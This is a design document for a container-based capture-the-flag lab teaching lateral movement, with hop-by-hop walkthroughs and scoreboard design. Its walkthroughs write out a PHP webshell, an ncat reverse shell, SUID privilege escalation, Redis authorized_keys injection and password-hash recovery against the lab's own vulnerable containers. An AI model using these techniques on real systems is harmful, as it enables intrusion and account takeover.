# Pivot Lab: Multi-Protocol Network Traversal Training Environment

## Design Document v5.0

---

## Changelog from v4.0

- **LAUNCHPAD: shellinabox replaces ttyd.** Each browser connection spawns an independent session. No shared terminal problem. Sourced from Alpine edge/testing (LAUNCHPAD only).
- **LAUNCHPAD: added nmap-ncat and linpeas.sh.** Attack platform gets baseline connectivity tools. LOTL applies to targets, not the workstation.
- **Hop 4 (WEBSHELL): added LinPEAS-driven SUID privilege escalation.** Player escalates from www-data to root via SUID `find`. First and only root acquisition in the lab.
- **Hop 5 (DROPZONE): added SSH entry with discoverable credentials.** Credentials found after Hop 4 privesc. `deployer` user has scoped sudo for `rc-service` and `apk`.
- **Hop 6: NFS replaced with TFTP.** NFS required `--privileged` Docker capabilities. TFTP (`tftp-hpa`) is in Alpine main, requires zero special caps, and teaches UDP service discovery.
- **Scoreboard backend: Python (Flask + gunicorn).** Maintainable, editable without compile steps. HTTPS deferred to Q4 roadmap.
- **Process supervisor: OpenRC only.** s6-overlay removed. Single supervisor, no conflicts.
- **Hint gating: sequential.** Hop N hints unlock only after Hop N-1 flag submitted.
- **Flag submission: auto-detect.** API searches all flags. No hop number required.
- **IP randomization: partial.** Last octet only. Wrapper script before compose-up.
- **Hash OSINT: online + local API fallback.** Self-contained when external services are unavailable.
- **Operational: reset.sh script + documentation.**

---

## 1. Purpose and Philosophy

This lab teaches beginner-to-intermediate security practitioners how attackers move laterally through segmented networks. The player starts with nothing but a web browser, gets a shell, and must chain exploits, tunnels, and protocol abuse across isolated network segments to collect flags.

Every container runs Alpine Linux (pinned `alpine:3.19`). Every service maps to a maintained Alpine APK package. No custom compilation. No external downloads at runtime. If Alpine ships it, we use it.

No Windows. No Active Directory. Pure Linux networking and services.

### 1.1 Design Principles

- **Zero prerequisites.** The player needs only a web browser. LAUNCHPAD provides a web terminal via shellinabox. Each connection spawns an independent session.
- **Persistence first.** The player's first real task is SSH key generation and authorized_keys creation. This pattern recurs at Hop 8 (Redis RCE).
- **Live off the land (on targets).** Target containers have minimal tooling. The player improvises with bash, curl, and builtins. LAUNCHPAD (the attack platform) has baseline tools because that is realistic.
- **Two services per container, minimum.** One vulnerable, one or more decoys. Trains enumeration discipline.
- **Some services are installed but stopped.** Filesystem inspection is a core skill.
- **Privilege escalation is earned once.** Root is obtained at Hop 4 via a LinPEAS-identified SUID binary. This single escalation enables operations requiring root on later hops.
- **Flags are randomized per session.** Format: `PIVOT{<container>_<random_12_hex>}`.
- **IPs are partially randomized.** Subnets fixed, last octet randomized per challenge container.
- **Hints are sequentially gated.** Hop N hints unlock only after Hop N-1 flag is submitted.
- **Everything resets cleanly.** `./reset.sh` or `docker compose down -v && docker compose up -d`.

---

## 2. Architecture Overview

### 2.1 Network Topology

```
┌──────────────────┐
│   PLAYER HOST    │
│                  │
│  (browser only)  │
│                  │
│  http://localhost:4200  <<<--- LAUNCHPAD (shellinabox)
│  http://localhost:8080  <<<--- SCOREBOARD
└────────┬─────────┘
         │
  ═══════╪════════════════════  net-launchpad (172.20.0.0/24)
         │
    ┌────┴──────┐    ┌──────────────┐
    │ LAUNCHPAD │    │  SCOREBOARD  │
    │shellinabox│    │  lighttpd    │
    │ (Hop 0)   │    │  + Flask API │
    │ no flag   │    │  (HTTP)      │
    └────┬──────┘    └──────────────┘
         │
  ═══════╪════════════════════  net-entry (172.20.1.0/24)
         │
    ┌────┴─────┐
    │  GATE    │
    │  ncat    │
    │  openssh │
    │  + smtp  │
    │  flag-01 │
    └────┬─────┘
         │
  ═══════╪════════════════════  net-alpha (172.20.2.0/24)
         │
    ┌────┴─────┐
    │  TUNNEL  │
    │  openssh │
    │  + http  │
    │  flag-02 │
    └────┬─────┘
         │
  ═══════╪════════════════════  net-bravo (172.20.3.0/24)
         │
    ┌────┴──────┐
    │  FILESERV │
    │  vsftpd   │
    │  + mysql  │
    │  flag-03  │
    └────┬──────┘
         │
  ═══════╪════════════════════  net-charlie (172.20.4.0/24)
         │
    ┌────┴──────┐
    │  WEBSHELL │
    │  lighttpd │
    │  + PHP    │
    │  SUID find│  <<<--- PRIVESC HERE
    │  + dns    │
    │  flag-04  │
    └────┬──────┘
         │
  ═══════╪════════════════════  net-delta (172.20.5.0/24)
         │
    ┌────┴──────┐
    │  DROPZONE │
    │  openssh  │
    │  lighttpd │  <<<--- INSTALLED BUT STOPPED
    │  mod_webdav│
    │  + ftp    │
    │  flag-05  │
    └────┬──────┘
         │
  ═══════╪════════════════════  net-echo (172.20.6.0/24)
         │
    ┌────┴──────┐
    │  DEPOT    │
    │  tftp-hpa │
    │  + snmp   │
    │  flag-06  │
    └────┬──────┘
         │
  ═══════╪════════════════════  net-foxtrot (172.20.7.0/24)
         │
    ┌────┴──────┐
    │  RESOLVER │
    │  bind     │
    │  + http   │
    │  flag-07  │
    └────┬──────┘
         │
  ═══════╪════════════════════  net-golf (172.20.8.0/24)
         │
    ┌────┴──────┐
    │  CACHE    │
    │  redis    │
    │  openssh  │
    │  + pgsql  │
    │  flag-08  │
    └────┬──────┘
         │
  ═══════╪════════════════════  net-hotel (172.20.9.0/24)
         │
    ┌────┴──────┐
    │  VAULT    │
    │  samba    │
    │  + imap   │
    │  flag-09  │
    └────┴──────┘
```

### 2.2 Hop Summary

| Hop | Container | Primary Service | Decoy/Other | Difficulty | Points | Landing User | Core Skill |
|-----|-----------|----------------|-------------|------------|--------|-------------|------------|
| 0 | LAUNCHPAD | shellinabox | None | N/A | 0 | player | Orientation, independent sessions |
| 1 | GATE | Netcat + SSH keygen | SMTP (Postfix) | Easy | 100 | ctf | Netcat, SSH key persistence |
| 2 | TUNNEL | SSH tunneling | HTTP (lighttpd 404) | Easy | 150 | operator | SSH -L/-R/-D, SOCKS proxy |
| 3 | FILESERV | FTP (vsftpd) | MySQL (MariaDB) | Easy | 200 | (FTP only) | Anonymous FTP, loot analysis |
| 4 | WEBSHELL | HTTP + PHP upload | DNS (dnsmasq) | Medium | 300 | www-data -> **root** | Upload, webshell, LinPEAS, SUID privesc |
| 5 | DROPZONE | WebDAV (stopped!) | FTP (locked down) | Medium | 400 | deployer (sudo) | Stopped service, WebDAV PUT, scoped sudo |
| 6 | DEPOT | TFTP | SNMP (junk OIDs) | Medium | 500 | (TFTP client) | UDP discovery, TFTP enumeration |
| 7 | RESOLVER | DNS (BIND) | HTTP (honeypot) | Medium-Hard | 600 | (DNS queries) | Zone transfers, DNS enumeration |
| 8 | CACHE | Redis | PostgreSQL | Hard | 800 | redis | Redis RCE, authorized_keys callback |
| 9 | VAULT | SMB (Samba) | IMAP (Dovecot) | Hard | 1000 | (SMB client) | Share enum, hash OSINT, exfiltration |

**Total possible points:** 4,050

### 2.3 Privilege Model

Root is earned **once**, at Hop 4. This root shell enables operations on later hops.

| Container | Landing User | Root? | How | Why Needed |
|-----------|-------------|-------|-----|------------|
| LAUNCHPAD | player | No | N/A | Attack platform |
| GATE | ctf | No | N/A | Flag readable by ctf |
| TUNNEL | operator | No | N/A | Tunneling is unprivileged |
| FILESERV | (FTP only) | No | N/A | Anonymous FTP, no shell |
| WEBSHELL | www-data | **Yes** | **SUID find** | Persistent root shell, cred discovery |
| DROPZONE | deployer | Partial | sudo (rc-service, apk) | Start stopped services |
| DEPOT | (TFTP client) | No | N/A | TFTP is unauthenticated |
| RESOLVER | (DNS queries) | No | N/A | DNS is unauthenticated |
| CACHE | redis | No | N/A | Redis user shell via SSH |
| VAULT | (SMB client) | No | N/A | SMB client is unprivileged |

### 2.4 Alpine Package Map

| Container | APK Packages (stable 3.19) | Non-APK / Notes |
|-----------|--------------------------|-----------------|
| LAUNCHPAD | `shellinabox`*, `bash`, `openssh-client`, `curl`, `openssl`, `nmap-ncat` | `linpeas.sh` downloaded at build. *shellinabox from edge/testing (LAUNCHPAD only) |
| SCOREBOARD | `lighttpd`, `py3-flask`, `py3-gunicorn`, `bash`, `jq`, `sqlite` | Hash lookup fallback DB |
| GATE | `nmap-ncat`, `openssh`, `postfix` | |
| TUNNEL | `openssh`, `lighttpd` | |
| FILESERV | `vsftpd`, `mariadb` | FTP seed data |
| WEBSHELL | `lighttpd`, `php83`, `php83-cgi`, `dnsmasq`, `findutils` | SUID set on /usr/bin/find |
| DROPZONE | `openssh`, `lighttpd`, `lighttpd-mod_webdav`, `php83`, `php83-cgi`, `vsftpd`, `sudo` | sudo rule for deployer |
| DEPOT | `tftp-hpa`, `net-snmp` | tftproot at /var/tftpboot/ |
| RESOLVER | `bind`, `lighttpd` | |
| CACHE | `redis`, `postgresql16`, `openssh` | SSH for redis user |
| VAULT | `samba`, `dovecot` | |

---

## 3. LAUNCHPAD: Zero-Prerequisite Entry Point

### 3.1 shellinabox over ttyd

shellinabox spawns an independent login session per browser connection. Two tabs = two shells. ttyd shares a single terminal across all connections. For a training lab where the player needs multiple simultaneous sessions (one on GATE, one monitoring tunnels, one on the scoreboard), independent sessions are essential.

shellinabox is in Alpine's edge/testing repo, not stable 3.19. Since LAUNCHPAD is the player's workstation (not a challenge target), pulling from edge/testing for this single container is acceptable. The Dockerfile pins the specific version.

```dockerfile
FROM alpine:3.19
RUN echo 'https://dl-cdn.alpinelinux.org/alpine/edge/testing' >> /etc/apk/repositories \
    && apk update \
    && apk add --no-cache shellinabox bash openssh-client curl openssl nmap-ncat \
    && wget -O /home/player/linpeas.sh \
       https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
    && chmod +x /home/player/linpeas.sh
```

**Air-gapped builds:** Bundle `linpeas.sh` in the build context. Pre-download the shellinabox APK.

### 3.2 What the Player Gets

```
/home/player/
├── BRIEFING.txt           lab overview, scoreboard URL, rules
├── LOTL-REFERENCE.txt     living off the land cheat sheet
├── linpeas.sh             privilege escalation scanner
└── .ssh/                  created by player during Hop 1
```

**Pre-installed tools:** bash, ssh/scp/ssh-keygen, curl, openssl, ncat

**Not installed (must improvise):** nmap, dig, smbclient, redis-cli, ftp, mount, showmount

### 3.3 Service Configuration

```
shellinaboxd -t -b -p 4200 --css /etc/shellinabox/options-enabled/00+Black-on-White.css \
  -s /:player:player:/home/player:/bin/bash
```

The `-t` flag disables SSL (HTTP per decision #6, HTTPS on Q4 roadmap). Each connection authenticates as `player` and lands in an independent bash session.

---

## 4. Detailed Hop Walkthroughs

### 4.1 Hop 0: LAUNCHPAD

**Points:** 0

1. Open `http://localhost:4200` in any browser
2. Land in a bash shell as `player`
3. Read BRIEFING.txt
4. Orient: `ip addr`, `ip route`, `cat /etc/hosts`
5. Discover GATE on net-entry
6. Connect to GATE to begin Hop 1

---

### 4.2 Hop 1: GATE (Netcat + SSH Key Persistence)

**Difficulty:** Easy | **Points:** 100 | **Landing User:** ctf

**Services:** ncat (9999/TCP), OpenSSH (22/TCP), Postfix (25/TCP decoy)

**Phase 1: Initial Access**
1. From LAUNCHPAD: `ncat <gate_ip> 9999`
2. Complete banner challenge, get restricted shell as `ctf`
3. Find flag-01 at `/home/ctf/flag-01.txt`

**Phase 2: SSH Key Persistence**
4. Read PERSISTENCE.txt
5. On LAUNCHPAD: `ssh-keygen -t ed25519 -f ~/.ssh/pivot_key -N ""`
6. On GATE (via ncat shell): `mkdir -p ~/.ssh && echo "<pubkey>" >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys`
7. Test from LAUNCHPAD: `ssh -i ~/.ssh/pivot_key ctf@<gate_ip>`

**Phase 3: Staging**
8. Explore `/tools/` minimal kit (ncat-static, socat-static, chisel)
9. Discover next segment via `/etc/hosts`, `ip route`

**Flag:** `/home/ctf/flag-01.txt`

**Breadcrumbs:**
- `/home/ctf/.notes/credentials.bak` contains TUNNEL SSH creds
- `/etc/hosts` maps `<tunnel_ip>` to hostname `tunnel`
- SMTP decoy on port 25 wastes time if explored

---

### 4.3 Hop 2: TUNNEL (SSH Reverse Tunnel)

**Difficulty:** Easy | **Points:** 150 | **Landing User:** operator

**Services:** OpenSSH (22/TCP), lighttpd (80/TCP decoy)

1. Find creds on GATE at `/home/ctf/.notes/credentials.bak`
2. SSH into TUNNEL: `ssh operator@<tunnel_ip>`
3. Collect flag-02 at `/home/operator/flag-02.txt`
4. `ip addr` shows two interfaces
5. Build tunnels:

```bash
ssh -L 2121:<fileserv_ip>:21 operator@<tunnel_ip>
ssh -D 1080 operator@<tunnel_ip>
```

**Flag:** `/home/operator/flag-02.txt`

**Breadcrumbs:**
- `.bash_history` references `<fileserv_ip>` and "ftp"
- `network-map.txt` sketches the next segment

---

### 4.4 Hop 3: FILESERV (FTP Credential Harvesting)

**Difficulty:** Easy | **Points:** 200 | **Landing User:** (FTP only)

**Services:** vsftpd (21/TCP, anonymous), MariaDB (3306/TCP decoy)

1. Connect via tunnel: `curl ftp://<fileserv_ip>/pub/`
2. Key loot:
   - `deploy.sh`: DROPZONE SSH creds (user: deployer)
   - `onboarding-notes.txt`: "Redis has no password set"
   - `webdav-setup.txt`: "WebDAV installed on dropzone but service stopped"
   - `webapp-backup.zip`: PHP source showing upload vuln
   - `tftp-notes.txt`: "TFTP server on depot, no auth, config backups exposed"
3. Flag-03 at `/srv/ftp/pub/backups/.flag-03.txt` (hidden file)

**Flag:** `/srv/ftp/pub/backups/.flag-03.txt`

---

### 4.5 Hop 4: WEBSHELL (Upload + Privilege Escalation)

**Difficulty:** Medium | **Points:** 300 | **Landing User:** www-data -> root

**Services:** lighttpd + PHP (80/TCP), dnsmasq (53/UDP decoy)

**Phase 1: Webshell**
1. Browse `http://<webshell_ip>/` through tunnel
2. Find upload form (`<!-- TODO: add file type validation -->`)
3. Upload PHP webshell: `<?php system($_GET['cmd']); ?>`
4. Execute: `curl "http://<ip>/uploads/shell.php?cmd=cat+/var/www/flag-04.txt"`

**Phase 2: Reverse Shell**
5. On LAUNCHPAD: `ncat -lvnp 4444`
6. Via webshell: `cmd=ncat+<launchpad_ip>+4444+-e+/bin/sh`
7. Now have interactive shell as www-data

**Phase 3: Privilege Escalation**
8. Transfer linpeas.sh from LAUNCHPAD (via ncat, curl, or scp through tunnel)
9. Run: `bash /tmp/linpeas.sh`
10. LinPEAS highlights in red/yellow: `-rwsr-xr-x 1 root root ... /usr/bin/find`
11. Exploit (from GTFOBins): `find . -exec /bin/sh -p \;`
12. Player is now root

**Phase 4: Credential Discovery**
13. As root: `cat /root/.deployment/dropzone-creds.txt`
14. Contains: deployer user + password for DROPZONE SSH

**Flag:** `/var/www/flag-04.txt`

**Dockerfile setup:** `RUN chmod u+s /usr/bin/find`

---

### 4.6 Hop 5: DROPZONE (WebDAV / Stopped Service)

**Difficulty:** Medium | **Points:** 400 | **Landing User:** deployer (sudo)

**Running at Boot:** OpenSSH (22/TCP), vsftpd (21/TCP, locked down)
**Installed but Stopped:** lighttpd + mod_webdav + PHP

1. SSH in using creds from Hop 4: `ssh deployer@<dropzone_ip>`
2. Port scan: SSH and FTP. FTP is locked down. No HTTP.
3. Filesystem inspection:

```bash
apk info                          # lighttpd, mod_webdav, php83 installed
ls /etc/init.d/                   # lighttpd init script exists
cat /etc/lighttpd/lighttpd.conf   # WebDAV config, PUT enabled
```

4. Start service: `sudo rc-service lighttpd start`
5. Enumerate: `curl -X OPTIONS http://localhost/webdav/ -v`
6. Upload: `curl -T shell.php http://localhost/webdav/shell.php`
7. Execute: `curl "http://localhost/webdav/shell.php?cmd=cat+/var/www/flag-05.txt"`

**Flag:** `/var/www/flag-05.txt`

**Sudo rule:** `deployer ALL=(root) NOPASSWD: /sbin/rc-service *, /sbin/apk *`

**Teaching moments:**
- Scoped sudo is still powerful if the allowed commands are useful
- `apk` access via sudo means the player can install packages on this container
- Not every vulnerability is visible through port scanning

---

### 4.7 Hop 6: DEPOT (TFTP Enumeration)

**Difficulty:** Medium | **Points:** 500 | **Landing User:** (TFTP client)

**Services:** tftp-hpa (69/UDP), net-snmp (161/UDP decoy)

**What TFTP Teaches:**
TFTP is UDP-based, unauthenticated by design, and invisible to TCP-only port scans. Players who only scan TCP will miss it entirely. This forces UDP awareness.

**tftproot contents (/var/tftpboot/):**

```
/var/tftpboot/
├── firmware/
│   └── router-backup.bin        red herring (binary garbage)
├── configs/
│   ├── switch-config.txt        contains RESOLVER IP and "dns zone: lab.pivot.local"
│   ├── firewall-rules.bak       mentions Redis port 6379, "no auth configured"
│   └── .flag-06.txt             hidden file, the flag
├── pxe/
│   └── README.txt               red herring PXE boot docs
└── README.txt                   "TFTP backup server. Firmware and config dumps."
```

**Intended Solution Path:**

1. Discover DEPOT on the network (via breadcrumbs from prior hops or scanning)
2. TCP scan shows nothing (TFTP is UDP-only on port 69)
3. Player must scan UDP: `ncat -u <depot_ip> 69` or improvise with bash
4. Recognize TFTP, retrieve files:

```bash
# Using curl (supports TFTP)
curl tftp://<depot_ip>/configs/switch-config.txt
curl tftp://<depot_ip>/configs/.flag-06.txt

# Or using tftp client if available
tftp <depot_ip>
> get configs/.flag-06.txt
```

5. SNMP decoy on 161/UDP returns fabricated OIDs suggesting services on nonexistent ports

**Flag:** `/var/tftpboot/configs/.flag-06.txt`

**Why TFTP over NFS:**

| Aspect | NFS | TFTP |
|--------|-----|------|
| Docker capabilities | SYS_ADMIN, privileged | None |
| APK repo | main | main |
| Authentication | UID-based (complex) | None (by design) |
| Protocol | TCP | UDP (teaches UDP scanning) |
| Real-world relevance | High | High (network equipment, PXE) |
| Implementation complexity | High (rpcbind, kernel modules) | Trivial |

---

### 4.8 Hop 7: RESOLVER (DNS Zone Transfer)

**Difficulty:** Medium-Hard | **Points:** 600 | **Landing User:** (DNS queries)

**Services:** BIND (53/TCP+UDP), lighttpd (80/TCP, honeypot login decoy)

1. `dig @<resolver_ip> lab.pivot.local AXFR` (via tunnel, may need to bring `dig`)
2. Zone dumps, flag in TXT record for `flag.lab.pivot.local`
3. Other records reveal CACHE IP, VAULT IP, Redis config hints
4. HTTP "router admin" page is a honeypot (wastes time)

**Zone Records:**

```
lab.pivot.local.         SOA   ns1.lab.pivot.local. admin.lab.pivot.local.
ns1.lab.pivot.local.     A     <resolver_ip>
cache.lab.pivot.local.   A     <cache_ip>
vault.lab.pivot.local.   A     <vault_ip>
flag.lab.pivot.local.    TXT   "PIVOT{resolver_<random_hex>}"
redis.lab.pivot.local.   CNAME cache.lab.pivot.local.
secret.lab.pivot.local.  TXT   "redis default port, no auth required"
admin.lab.pivot.local.   A     <resolver_ip>           (points to HTTP honeypot)
smtp.lab.pivot.local.    A     <nonexistent_ip>         (red herring)
```

**Flag:** TXT record for `flag.lab.pivot.local`

---

### 4.9 Hop 8: CACHE (Redis RCE)

**Difficulty:** Hard | **Points:** 800 | **Landing User:** redis

**Services:** Redis (6379/TCP, no auth), OpenSSH (22/TCP), PostgreSQL (5432/TCP decoy)

1. Build tunnel chain to reach Redis
2. Connect (improvise without redis-cli):

```bash
# Using bash /dev/tcp
exec 3<>/dev/tcp/<cache_ip>/6379
echo -e "KEYS *\r\n" >&3; cat <&3
echo -e "GET flag-08\r\n" >&3; cat <&3
```

3. Retrieve flag-08
4. For shell access (callback to Hop 1):

```bash
# Same authorized_keys pattern learned at Hop 1
CONFIG SET dir /home/redis/.ssh/
CONFIG SET dbfilename "authorized_keys"
SET payload "\n\nssh-ed25519 AAAA...player_pubkey...\n\n"
SAVE
```

5. SSH into CACHE as `redis` user: `ssh -i ~/.ssh/pivot_key redis@<cache_ip>`

**Note:** The SAVE command writes the entire RDB dump to disk. The authorized_keys file will contain binary RDB headers around the key. SSH tolerates this (it parses line by line and ignores non-key lines). The `\n\n` padding ensures the key appears on its own line.

**Flag:** Redis key `flag-08`

---

### 4.10 Hop 9: VAULT (SMB + Hash OSINT)

**Difficulty:** Hard | **Points:** 1,000 | **Landing User:** (SMB client)

**Services:** Samba (445/TCP, 139/TCP), Dovecot IMAP (143/TCP decoy)

1. Enumerate shares (must bring smbclient or improvise)
2. `public` and `backup` visible. `classified` hidden (non-browseable).
3. Download `shadow.bak` from `backup` share
4. Extract hash, identify algorithm by format/length
5. Search hash online (CrackStation, hashes.org) or use scoreboard fallback API
6. Validate plaintext via scoreboard: `POST /api/validate-hash`
7. Authenticate: `smbclient //<vault_ip>/classified -U vaultadmin`
8. Retrieve flag-09

**Samba Shares:**

```
[public]       guest ok = yes, browseable = yes, read only
[backup]       guest ok = yes, browseable = yes, read only (contains shadow.bak)
[classified]   guest ok = no, browseable = no, valid users = vaultadmin
```

**Flag:** `/srv/samba/classified/flag-09.txt`

---

## 5. Scoreboard and Hint System

### 5.1 Architecture

Python Flask application served by gunicorn behind lighttpd. State stored in SQLite. HTTP only (HTTPS on Q4 roadmap).

```
SCOREBOARD container:
  lighttpd (port 8080) -> reverse proxy -> gunicorn (4 workers) -> Flask app
  SQLite database: /var/lib/scoreboard/state.db
  Hash lookup DB: /var/lib/scoreboard/hashes.db (fallback for Hop 9)
```

### 5.2 API Endpoints

```
POST   /api/flags          Submit a flag (auto-detect hop)
GET    /api/progress        Current session progress
POST   /api/hints           Request a hint (sequential gating enforced)
GET    /api/hints/{hop}     Available hints for a hop (gated)
GET    /api/session         Session info
POST   /api/validate-hash   Validate a cracked hash (Hop 9)
GET    /api/hash-lookup     Fallback hash lookup (local DB)
```

### 5.3 Flag Submission (Auto-Detect)

```
POST /api/flags
{
  "flag": "PIVOT{fileserv_a7b2c9d1e3f4}"
}

Response (success):
{
  "valid": true,
  "hop": 3,
  "container": "FILESERV",
  "points_awarded": 200,
  "total_score": 450,
  "message": "FILESERV compromised."
}

Response (wrong):
{
  "valid": false,
  "message": "Invalid flag."
}

Response (duplicate):
{
  "valid": true,
  "hop": 3,
  "points_awarded": 0,
  "total_score": 450,
  "message": "Flag already submitted."
}
```

No hop number required. The API searches all flags and returns which hop matched.

### 5.4 Sequential Hint Gating

Hints for Hop N are only available after the Hop N-1 flag has been submitted.

```
GET /api/hints/5

Response (Hop 4 not completed):
{
  "available": false,
  "message": "Complete Hop 4 to unlock hints for Hop 5.",
  "requires": "hop-04"
}

Response (Hop 4 completed):
{
  "available": true,
  "hints_used": 0,
  "hints_total": 3,
  "next_hint_cost": 40
}
```

Exception: Hop 1 hints are always available.

### 5.5 Hint Tiers and Costs

| Tier | Cost | Reveals |
|------|------|---------|
| Nudge | 10% | General direction |
| Guide | 25% | Specific technique |
| Walkthrough | 50% | Step-by-step commands (minus flag) |

Cumulative: all three = 85% of hop points. Player always earns at least 15%.

### 5.6 Hash Lookup Fallback

```
GET /api/hash-lookup?hash=5f4dcc3b5aa765d61d8327deb882cf99

Response:
{
  "found": true,
  "algorithm": "MD5",
  "plaintext": "password",
  "source": "local"
}
```

A small SQLite database bundled with the scoreboard contains common password hashes. The Hop 9 hash is guaranteed to be in this database. Players are encouraged to try online lookup first (CrackStation, hashes.org), but the local fallback ensures the lab is self-contained.

### 5.7 Web UI

Single HTML file. Vanilla JS. Polls `/api/progress` every 10 seconds. Hop cards auto-generate from the API manifest.

---

## 6. Living Off the Land

### 6.1 Attack Platform vs. Target

| | LAUNCHPAD (Attack Platform) | Target Containers |
|-|---------------------------|-------------------|
| Philosophy | Realistic workstation | Live off the land |
| Tools | ncat, curl, ssh, linpeas.sh | Almost nothing |
| Rationale | Your laptop has tools | Compromised servers do not |

### 6.2 Minimal Survival Kit (GATE /tools/)

```
/tools/
├── ncat-static     listeners, reliable connections
├── socat-static    bidirectional relays
├── chisel          SOCKS proxy, multi-hop tunnels
└── README.txt      "This is all you get."
```

### 6.3 Improvisation Reference (in BRIEFING.txt)

**Parallel Port Scanner:**
```bash
scan() {
  local host=$1
  for port in 21 22 25 53 69 80 111 139 143 161 443 445 993 2049 3306 5432 6379 8080 8443 9999; do
    (echo >/dev/tcp/$host/$port) 2>/dev/null && echo "$port open" &
  done
  wait
}
```

**Bash TCP Client:**
```bash
exec 3<>/dev/tcp/<ip>/<port>
echo "HELLO" >&3
cat <&3
```

**Curl Multi-Protocol:**
```bash
curl http://<ip>/                              # HTTP
curl ftp://<ip>/pub/                           # FTP listing
curl -T payload.php http://<ip>/webdav/        # WebDAV PUT
curl tftp://<ip>/configs/file.txt              # TFTP
curl telnet://<ip>:<port>                      # raw TCP
```

**File Transfer:**
```bash
# ncat pipe
ncat -l -p 9000 > tool < /dev/null   # receiver
ncat <ip> 9000 < tool                 # sender

# base64 over shell
base64 tool | tr -d '\n'              # source
echo "<b64>" | base64 -d > tool       # target

# busybox httpd (available on Alpine)
busybox httpd -f -p 8000 -h /path/   # serve files
curl http://<ip>:8000/tool -o tool    # fetch
```

**Redis Without redis-cli:**
```bash
exec 3<>/dev/tcp/<redis_ip>/6379
echo -e "KEYS *\r\n" >&3; cat <&3
echo -e "GET flag-08\r\n" >&3; cat <&3
```

**Reading /proc (no tools needed):**
```bash
cat /proc/net/tcp                     # TCP connections in hex
printf "%d\n" 0x0050                  # convert hex port (80)
```

---

## 7. Stopped Service Pattern

### 7.1 Primary: DROPZONE (Hop 5)

lighttpd + mod_webdav installed, configured, not started. Player discovers via `apk info`, `ls /etc/init.d/`, starts with `sudo rc-service lighttpd start`.

### 7.2 Secondary (Bonus)

| Container | Stopped Tool | Enables |
|-----------|-------------|---------|
| CACHE | socat (installed) | Ad-hoc tunnel creation |
| VAULT | nmap-ncat (installed) | Local port interaction |

### 7.3 Discovery Commands

```bash
apk info                     # installed packages
apk info -L <pkg>            # files from package
ls /etc/init.d/              # init scripts
rc-status --all              # running vs. stopped
ss -tlnp                     # listening sockets
which socat ncat curl wget   # available binaries
find /etc -name "*.conf"     # config files
```

---

## 8. Decoy Services

| Container | Decoy | Port | Behavior | APK |
|-----------|-------|------|----------|-----|
| GATE | Postfix SMTP | 25/TCP | Rejects all relay | `postfix` |
| TUNNEL | lighttpd | 80/TCP | Static "404 Decommissioned" | `lighttpd` |
| FILESERV | MariaDB | 3306/TCP | Auth required, unknown creds | `mariadb` |
| WEBSHELL | dnsmasq | 53/UDP | Recursive only, no zone data | `dnsmasq` |
| DROPZONE | vsftpd | 21/TCP | No anon, strong creds | `vsftpd` |
| DEPOT | net-snmp | 161/UDP | Junk OIDs on `public` community | `net-snmp` |
| RESOLVER | lighttpd | 80/TCP | Fake router admin login | `lighttpd` |
| CACHE | PostgreSQL | 5432/TCP | md5 auth, unknown creds | `postgresql16` |
| VAULT | Dovecot IMAP | 143/TCP | Authenticates, empty mailboxes | `dovecot` |

---

## 9. Randomization Strategy

### 9.1 Flags

Generated by init container at compose-up. Format: `PIVOT{<container>_<random_12_hex>}`. Written to shared volume.

### 9.2 IP Randomization (Partial)

Subnets fixed. Only the last octet of each challenge container is randomized (.50-.200). Infrastructure containers have fixed addresses:

| Container | IP |
|-----------|-----|
| LAUNCHPAD | 172.20.0.11 (fixed) |
| SCOREBOARD | 172.20.0.10 (fixed) |
| Challenge containers | 172.20.X.{50-200} (randomized) |

A wrapper script (`start.sh`) generates the `.env` file with randomized octets before calling `docker compose up`.

### 9.3 Classroom

```bash
for team in alpha bravo charlie; do
  COMPOSE_PROJECT_NAME="pivotlab-${team}" ./start.sh
done
```

---

## 10. Credential Chain

Explicit end-to-end credential flow. No broken links.

```
Hop 0  LAUNCHPAD     /etc/hosts reveals GATE IP
       |
Hop 1  GATE          /home/ctf/.notes/credentials.bak -> TUNNEL SSH creds
       |              /etc/hosts -> TUNNEL IP
       |
Hop 2  TUNNEL        .bash_history -> FILESERV IP
       |              network-map.txt -> segment sketch
       |
Hop 3  FILESERV      deploy.sh -> DROPZONE SSH creds (deployer)
       |              onboarding-notes.txt -> Redis no auth
       |              webdav-setup.txt -> DROPZONE WebDAV stopped
       |              tftp-notes.txt -> DEPOT TFTP, no auth
       |              webapp-backup.zip -> WEBSHELL upload vuln
       |
Hop 4  WEBSHELL      /root/.deployment/dropzone-creds.txt -> DROPZONE SSH (after privesc)
       |
Hop 5  DROPZONE      lighttpd.conf -> WebDAV config (after starting service)
       |
Hop 6  DEPOT         configs/switch-config.txt -> RESOLVER IP, zone name
       |              configs/firewall-rules.bak -> Redis port, no auth
       |
Hop 7  RESOLVER      DNS AXFR -> CACHE IP, VAULT IP, Redis hints
       |
Hop 8  CACHE         Redis keys -> flag, then SSH key injection for shell
       |              ip route -> VAULT segment visible
       |
Hop 9  VAULT         backup share -> shadow.bak -> hash -> vaultadmin password
```

---

## 11. Container Build Strategy

### 11.1 Base Image

```dockerfile
FROM alpine:3.19
RUN apk update && apk add --no-cache bash coreutils openrc
```

### 11.2 Process Supervision: OpenRC Only

No s6-overlay. All service management via OpenRC. Entrypoint scripts start boot services:

```bash
#!/bin/bash
# entrypoint.sh for multi-service containers
rc-service openssh start
rc-service vsftpd start
# lighttpd deliberately NOT started (DROPZONE)
exec tail -f /dev/null  # keep container alive
```

### 11.3 Directory Structure

```
pivot-lab/
├── docker-compose.yml
├── .env.template
├── start.sh                  generates .env, calls compose up
├── reset.sh                  tears down, regenerates, brings up
├── init/
│   ├── Dockerfile
│   └── generate.sh
├── launchpad/
│   ├── Dockerfile
│   ├── briefing.txt
│   └── lotl-reference.txt
├── scoreboard/
│   ├── Dockerfile
│   ├── app.py                Flask application
│   ├── config/
│   │   └── lighttpd.conf
│   ├── www/
│   │   └── index.html
│   └── data/
│       └── hashes.db         hash lookup fallback
├── containers/
│   ├── base/
│   │   └── Dockerfile
│   ├── gate/
│   ├── tunnel/
│   ├── fileserv/
│   ├── webshell/
│   ├── dropzone/
│   ├── depot/
│   ├── resolver/
│   ├── cache/
│   └── vault/
├── tools/
│   ├── ncat-static
│   ├── socat-static
│   └── chisel
├── hints/
│   ├── hop-01-gate.json
│   └── ...
└── flags/                    generated at runtime
```

---

## 12. Deployment and Operations

### 12.1 Startup

```bash
git clone <repo> && cd pivot-lab
./start.sh
# Open http://localhost:4200 (terminal)
# Open http://localhost:8080 (scoreboard)
```

